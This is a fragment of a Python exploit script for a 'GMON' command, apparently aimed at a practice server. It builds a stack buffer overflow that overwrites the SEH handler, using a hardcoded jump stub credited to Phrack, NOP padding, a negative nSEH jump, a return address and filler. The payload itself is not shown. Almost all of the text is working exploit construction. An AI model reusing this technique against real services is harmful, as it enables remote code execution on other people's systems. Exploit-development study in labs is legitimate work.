...
print "GMON command - Exploit, Phrack JMP (Issue 62, Article 7)\n"
...
try:
    ...
    # Phrack JMP
    phrack_jmp = "\xd9\xee\xd9\x74\x24\xf4\x59\x80\xc1\x0a\x90\xfe\xcd\xfe\xcd\xff\xe1"
    phrack_jmp_buffer = '\x90'*(90-len(phrack_jmp)) + phrack_jmp + '\x90'*10
   
    nseh = '\xeb\xD0\x90\x90' # Negative jump, 48 bytes
    seh = struct.pack("<I", 0x625010B4) 
    buffer = "GMON /.:/" + 'A'* (3495-100-len(shellcode_buffer)) + shellcode_buffer + phrack_jmp_buffer + nseh + seh + 'E' * (5000-3495-4-4)
